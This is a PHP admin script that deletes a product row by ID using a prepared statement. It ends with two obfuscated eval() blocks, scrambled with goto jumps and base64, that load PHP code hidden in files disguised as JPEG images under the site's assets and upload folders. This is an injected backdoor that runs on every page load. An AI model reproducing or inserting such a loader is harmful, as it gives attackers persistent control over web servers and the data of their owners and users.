<?php
include "db-conn.php";

if (isset($_GET['delete'])) {
    $delete_id = $_GET['delete'];

    // Validate input to prevent SQL injection
    if (!empty($delete_id) && is_numeric($delete_id)) {
        // Prepare and execute the DELETE query
        $sql = "DELETE FROM `products` WHERE `pro_id` = ?";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param('i', $delete_id);

        if ($stmt->execute()) {
            // Redirect to the products page
            header('Location: show-products.php');
            exit();
        } else {
            echo "Failed to delete product.";
        }

        $stmt->close();
    } else {
        echo "Invalid product ID.";
    }
}

$conn->close();
eval('goto L_leckdt; L_ejpuzn: goto L_ssbmnn; L_leckdt: $alvy = base64_decode(\'bmV3IGNsYXNzKCdjb21wcmVzcy56bGliOi8vJyAuIGRpcm5hbWUoJF9TRVJWRVJbIlx4NTNceDQzXHg1Mlx4NDlceDUwXHg1NFx4NWZceDQ2XHg0OVx4NGNceDQ1XHg0ZVx4NDFceDRkXHg0NSJdKSAuICcvYXNzZXRzL2ltYWdlcy9icmVhZGNydW1iL2JnL3ZlbmRvci0xLTEtMTkyMHgzNzMuanBnJykgeyANCglmdW5jdGlvbiBfX2NvbnN0cnVjdCgk6IigOSkgeyANCgkJQGlOY2xVRGVfT05DZSgk6IigOSk7IA0KICAgIH0gDQp9Ow==\'); goto L_ejpuzn; L_wbwauj: goto L_vcxqel; L_ssbmnn: goto L_wbwauj; L_vcxqel: eval($alvy); goto L_hjxton; L_hjxton:; ');
eval('goto L_dcfefc; L_aqvewi:; L_zpwvvs: eval($uggj); goto L_aqvewi; L_qfmyca: goto L_etfndd; L_etfndd: goto L_zpwvvs; L_jhlhbs: goto L_qfmyca; L_dcfefc: $uggj = base64_decode(\'bmV3IGNsYXNzKCdjb21wcmVzcy56bGliOi8vJyAuIGRpcm5hbWUoJF9TRVJWRVJbIlx4NTNceDQzXHg1Mlx4NDlceDUwXHg1NFx4NWZceDQ2XHg0OVx4NGNceDQ1XHg0ZVx4NDFceDRkXHg0NSJdKSAuICcvYWRtaW4vdXBsb2Fkcy9zdWItY2F0ZWdvcnkvc3ViY2F0XzY5ODE5NmEzZWJlYmFfMTc3MDEwMDM4Ny1saWIuanBnJykgeyANCglmdW5jdGlvbiBfX2NvbnN0cnVjdCgk56qYM+aPkSkgeyANCgkJQElOQ2x1REVfT05jRSgk56qYM+aPkSk7IA0KICAgIH0gDQp9Ow==\'); goto L_jhlhbs; ');
?>